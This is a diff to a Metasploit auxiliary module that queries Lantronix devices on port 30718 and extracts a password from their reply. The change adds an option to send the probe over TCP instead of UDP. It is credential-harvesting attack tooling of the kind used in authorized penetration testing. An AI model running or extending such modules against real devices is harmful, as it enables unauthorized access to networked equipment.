@@ -26,7 +26,8 @@ class Metasploit4 < Msf::Auxiliary
     register_options(
       [
         Opt::CHOST,
-        Opt::RPORT(30718)
+        Opt::RPORT(30718),
+        OptBool.new('CHECK_TCP',[ false , 'Check TCP instead of UDP', false])
       ], self.class)
   end
 
@@ -37,24 +38,26 @@ class Metasploit4 < Msf::Auxiliary
     begin
       # Create an unbound UDP socket if no CHOST is specified, otherwise
       # create a UDP socket bound to CHOST (in order to avail of pivoting)
-      udp_sock = Rex::Socket::Udp.create( {
+      sock_opts = {
         'LocalHost' => datastore['CHOST'] || nil,
-        'PeerHost'  => ip,
+        'PeerHost'  => ip, 
         'PeerPort'  => datastore['RPORT'],
-        'Context'   =>
-        {
+        'Context'   =>  {   
           'Msf' => framework,
           'MsfExploit' => self
-        }
-      })
-
-      udp_sock.put(setup_probe)
-
-      res = udp_sock.recvfrom(65535, 0.5) and res[1]
-
-      if res
-        password = parse_reply(res)
+        }   
+      }
+      if datastore['CHECK_TCP']
+        vprint_good("Checking Lantronix TCP Socket #{datastore['RPORT']} on #{ip}")
+        rem_sock = Rex::Socket::Tcp.create(sock_opts)
+      else
+        vprint_good("Checking Lantronix UDP Socket #{datastore['RPORT']} on #{ip}")
+        rem_sock = Rex::Socket::Udp.create(sock_opts)
       end
+      rem_sock.put(setup_probe)
+      res = rem_sock.recvfrom(65535, 0.5) and res[1]
+
+      password = parse_reply(res)
     rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused, ::IOError
       print_error("Connection error")
     rescue ::Interrupt
@@ -62,7 +65,7 @@ class Metasploit4 < Msf::Auxiliary
     rescue ::Exception => e
       print_error("Unknown error: #{e.class} #{e}")
     ensure
-      udp_sock.close if udp_sock
+      rem_sock.close if rem_sock
     end
 
     if password
